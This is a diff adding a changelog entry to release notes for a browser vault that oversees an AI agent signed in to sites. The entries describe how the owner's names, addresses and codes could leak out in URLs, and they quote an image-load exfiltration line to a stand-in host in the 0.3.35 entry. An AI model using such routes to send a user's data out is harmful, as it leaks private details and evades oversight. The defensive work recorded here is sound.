@@ -2,6 +2,15 @@
 
 Every release of the Python SDK, MCP server and browser vault (`authyouragent` on PyPI, `ghcr.io/kjames2001/authyouragent-vault`), with the changes to the service at authyouragent.com that shipped alongside it. Newest first. Versions are tagged `py-vX.Y.Z` (PyPI) and `js-vX.Y.Z` (npm).
 
+## 0.3.36 (2026-10-08)
+
+### Short wordy data cannot leave in an address either
+- 0.3.33 stopped codes, numbers, phone numbers and emails the agent read on a signed-in site from leaving in an address it writes for another site. Words were still free: the owner's name, street, company or a delivery note fit in a few characters (`?n=Kagiso+Owner`) and opened with no card.
+- On a site the agent is signed in to, the vault now also remembers short phrases that are probably the owner's own: the text after a personal label (Name, Address, Deliver to, Company, Note and similar) and each comma part of it, a person's name inside such a text ("Leave it with Neo Kgosi" also keeps "Neo Kgosi"), and Capitalised 2-6 word lines next to an email or phone number (the details block).
+- An address for another site that carries one of them gets the red "Possibly unsafe" card, in any case, joined up or split, percent-encoded, base64 or hex, the same as values.
+- Not phrases: the site's own link and button labels, page titles, common page words ("Order History", "Customer Care"), anything shorter than 8 letters, and anything on a public page. Measured on 10 real sites read as if signed in: 1 phrase kept in total and no extra cards over 328 searches built from their own headings.
+- Found by a Reddit commenter on r/mcp asking about data that is short and has no digits.
+
 ## 0.3.35 (2026-10-07)
 - The 0.3.34 pin let a GET to another site through during an approved click, so an image or page load with the data in its address (`new Image().src = "https://elsewhere/?d=..."`) still got out. Now any GET to a site not on the card that carries a query is blocked while the click runs.
 - Sites the page only fetched from before the card no longer count as allowed. Only sites it loaded scripts, frames, images, styles or fonts from do.
